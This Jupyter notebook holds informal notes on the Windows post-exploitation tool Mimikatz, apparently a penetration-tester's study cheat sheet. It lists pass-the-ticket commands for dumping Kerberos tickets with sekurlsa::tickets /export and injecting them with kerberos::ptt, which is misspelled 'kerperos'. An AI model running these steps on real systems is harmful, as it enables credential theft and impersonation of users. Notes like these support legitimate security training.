{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f3308a79-a963-4921-a35d-53c786f2f182",
   "metadata": {},
   "source": [
    "# MimiKatz\n",
    "\n",
    "Mimikatz is a post-exploit tool used for dumping user credentials once you already have access to a Windows machine.\n",
    "\n",
    "## Install\n",
    "Good question.... Looks to be an EXE you can copy....\n",
    "\n",
    "## Running\n",
    "From Windows CMD, just run the EXE. This will update your terminal to \"mimikat #\" and the below commands must be run inside this environment.\n",
    "<hr>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c05bb236-7631-4a31-894d-337b1e0a1a15",
   "metadata": {},
   "source": [
    "## Pass The Ticket\n",
    "\n",
    "\n",
    "### Check Privilege\n",
    "First you need make sure you're running cmd as an admin (local is sufficient).\n",
    "\n",
    "> privilege::debug\n",
    "\n",
    "This should return \"Privilege '20' OK\"<br>\n",
    "\n",
    "### Dump\n",
    "Next, dump the tickets to the pwd\n",
    "\n",
    "> sekurlsa::tickets /export\n",
    "\n",
    "This will dump the current tickets. You can also use one that has already been dumped, such as by Rubeus.<br>\n",
    "\n",
    "### Pass The Ticket\n",
    "You can now pass the file as a ticket. The names can be quite detailed but everything needs to be included, that includes the square brackets and special characters.\n",
    "\n",
    "> kerperos::ptt [file.ext]\n",
    "\n",
    "### Verify\n",
    "You can verify your are using the ticket with\n",
    "\n",
    "> klist\n",
    "\n",
    "<hr>"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
